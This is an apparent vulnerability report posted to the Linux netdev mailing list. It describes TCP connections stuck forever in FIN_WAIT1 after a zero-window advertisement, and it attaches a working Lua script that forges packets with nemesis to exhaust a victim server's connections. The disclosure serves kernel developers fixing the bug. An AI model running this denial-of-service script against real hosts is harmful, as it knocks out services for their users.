From: Andrey Dmitrov <andrey.dmitrov@oktetlabs.ru>
Subject: TCP connection will hang in FIN_WAIT1 after closing if zero window
 is advertised
Date: Mon, 15 Sep 2014 20:11:44 +0400
Message-ID: <54170FC0.6020907@oktetlabs.ru>
Mime-Version: 1.0
Content-Type: multipart/mixed;
 boundary="------------090700000706020201030603"
Cc: "Alexandra N. Kossovsky" <Alexandra.Kossovsky@oktetlabs.ru>,
	Konstantin Ushakov <kostik@oktetlabs.ru>
To: netdev@vger.kernel.org
Return-path: <netdev-owner@vger.kernel.org>
Received: from shelob.oktetlabs.ru ([84.52.89.53]:37482 "EHLO
	shelob.oktetlabs.ru" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
	with ESMTP id S1752808AbaIOQRn (ORCPT
	<rfc822;netdev@vger.kernel.org>); Mon, 15 Sep 2014 12:17:43 -0400
Sender: netdev-owner@vger.kernel.org
List-ID: <netdev.vger.kernel.org>

This is a multi-part message in MIME format.
--------------090700000706020201030603
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 7bit

Greetings,

there is possible vulnerability in the TCP stack. Closing a socket after 
the TCP zero window advertising by peer leads to the socket stuck in 
FIN_WAIT1 state. FIN-ACK packet is not sent and not retransmitted. So 
the connection remains alive and without relation to any socket while 
the peer sends replies to the zero probe packets. It is possible to 
create a lot of connections in the same manner which will be in 
FIN_WAIT1 state forever.

Linux version 3.13-1-amd64 (debian-kernel@lists.debian.org) (gcc version 
4.8.2 (Debian 4.8.2-16) ) #1 SMP Debian 3.13.10-1 (2014-04-15)

I've written a script on Lua to reproduce this issue, find it in 
attachment please. I've used it with two hosts host_A (victim) and 
host_B (attacker), which are directly connected to each other. host_A 
has lighttpd installed and runned. Actually host_A can have any opened 
TCP listener socket to be attacked. If it closes any established with 
attacker connection it will stuck in the FIN_WAIT1 state. The script 
creates a number of TCP connections with the victim and sends replies 
for the zero window probe packets.

The test requires lua, tcpdump and nemesis on the host_B:
aptitude install lua5.1 lua5.1-posix nemesis tcpdump

How to run the test:
1. Run a httpd daemon on the host_A (I've used lighttpd).
2. Copy the test script attack.lua to the host_B.
3. Fill in the tested interfaces configuration (source, destination IP 
and MAC addresses) in the beginning of the file attack.lua. You can set 
maximum connections number in the variable *limit*, by default it is 500.
4. Set a fake MAC address for victim interface in host_B ARP table. It 
is to prevent host_B system replies (RST) receiving by the host_A:
     sudo arp -s <host_A IP addr> <any MAC address>
5. Run the test script on the host_B:
     sudo ./attack.lua

After ~10 minutes you will see 500 connections in the FIN_WAIT1 state on 
the host_A:
netstat | grep FIN_WAIT1 | wc -l
500

Even if you close the http daemon the connections still will be alive.

Thanks,
Andrey Dmitrov

--------------090700000706020201030603
Content-Type: text/x-lua;
 name="attack.lua"
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment;
 filename="attack.lua"

#!/usr/bin/lua

require("posix")
require("math")
require("os")

--~ Network configuration
--~ Source = attacker
--~ Destination = victim
local limit = 500 -- Maximum connections number
local iface = "eth3" -- Source (attacker) interface
local src_mac = "00:0f:53:01:39:94" -- Actual source interface MAC
local dst_mac = "00:0f:53:01:39:7c" -- Actual destination (victim) interface MAC
local src = "10.0.5.1" -- Source IP
local dst = "10.0.5.2" -- The destination IP
local dst_poprt = 80 -- The destination port

local nemesis = string.format("nemesis tcp -d %s -S %s -D %s -y %d -H %s -M %s",
                              iface, src, dst, dst_poprt, src_mac, dst_mac)


--~ Set fake MAC of the victim interface in the ARP table to prevent the attacker
--~ system replies receiving by the victim
--~ os.execute(string.format("arp -s %s 00:0c:29:c0:94:bf", dst))

math.randomseed(os.time())

function get_port(cs, idx)
  local port 
  local conn
  local i
  local ex

  repeat
    port = math.random(30000, 60000)
    ex = false

    for i, conn in pairs(cs) do
      if conn.port == port then
        ex = true
        break
      end
    end
  until not ex

  return port
end

function send_syn(conn, port, seqn)
  local cmd

  conn.port = port
  conn.seqn = (seqn + math.random(1000, 5000)) % 4294967295

  cmd = string.format("%s -fS -x %d -s %s -a 0 -w 29200 >/dev/null", nemesis,
                      conn.port, tostring(conn.seqn))
  print(cmd)
  os.execute(cmd)
  conn.seqn = conn.seqn + 1

  return seqn
end

function get_conn_by_port(cs, port)
  local i
  local conn

  for i, conn in pairs(cs) do
    if tonumber(conn.port) == tonumber(port) then
      return conn
    end
  end

  return nil
end

function send_ack(conn, packet, ackn)
  local win = 0

  if not ackn or not conn.seqn then
    return
  end

  conn.ackn = ackn
  cmd = string.format("%s -fA -x %d -s %s -a %s -w %d >/dev/null", nemesis,
                      conn.port, tostring(conn.seqn), tostring(ackn), win)
  print(cmd)
  os.execute(cmd)
end

function send_reply(cs, packet)
  local conn

  if not packet then
    return
  end

  conn = get_conn_by_port(cs, packet.src_port)
  if not conn then
    return
  end

  if packet.flags == "S." then
    send_ack(conn, packet, packet.seqn + 1)
  elseif packet.flags == "." then
    if packet.seqn == nil then
      packet.seqn = conn.ackn
    end
    send_ack(conn, packet, packet.seqn)
  end
end

function get_packet(line)
  local packet = {}
  local psrc
  local pdst

  if not line then
    return nil
  end

  --~ Skip unexpected and outgoing packets
  psrc = string.find(line, src)
  pdst = string.find(line, dst)
  if not pdst or not pdst or psrc < pdst then
    return nil
  end

  packet.src_port = line:match(src .. ".(%d+)")
  packet.dst_port = line:match(dst .. ".(%d+)")
  packet.flags = line:match("%[([%a,%.]+)%]")
  packet.seqn = line:match("seq (%d+)")
  packet.ackn = line:match("ack (%d+)")
  print(packet.src_port, packet.dst_port, packet.flags, packet.seqn, packet.ackn)

  return packet
end

function main_loop()
  local packet
  local cs = {}
  local idx = 0
  local f
  local seqn = 1971746917
  local prev_time = 0
  local curr_time

  f = io.popen("tcpdump -i " .. iface .. " -l -n tcp src port 80")

  while true do
    if idx < limit then
      curr_time = os.time()
      if curr_time ~= prev_time then
        prev_time = curr_time
        idx = idx + 1
        cs[idx] = {}
        cs[idx].idx = idx
        seqn = send_syn(cs[idx], get_port(cs, idx), seqn)
      end
    end

    packet = get_packet(f:read("*l"))
    send_reply(cs, packet)

  end

  io.close(f)
end

main_loop()

--------------090700000706020201030603--
